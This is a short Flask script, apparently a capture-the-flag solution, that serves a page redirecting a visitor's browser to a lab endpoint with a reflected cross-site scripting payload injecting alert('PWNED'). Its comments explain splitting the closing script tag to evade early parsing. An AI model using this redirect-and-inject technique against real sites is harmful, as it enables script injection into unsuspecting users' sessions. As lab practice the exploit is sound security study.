from flask import Flask
import requests
# goal: Use scrf to perform XSS (inject an alert("PWNED");)
# This is done via a helpful endpoint, /ephemeral
# NOTE: The code that takes the code is sandwiched with script tags,
# so the js script needs to be created dynamically to prevent being parsed
# HTML finds the script tags and lays the structure otu BEFORE JS comes in
# so separating the JS </script> tag will prevent an early "closeout", but
# this is not true for python which would fill out that string before it submits
app = Flask(__name__)

@app.route("/")
def respond():
    url = "http://challenge.localhost/ephemeral"

    form_html = f"""<script>
    let payload = "<script>alert('PWNED')</s"+"cript>";
    window.location.href="{url}?msg="+encodeURIComponent(payload);
    </script>
    """
    return form_html


app.run(debug=True, port=1337)
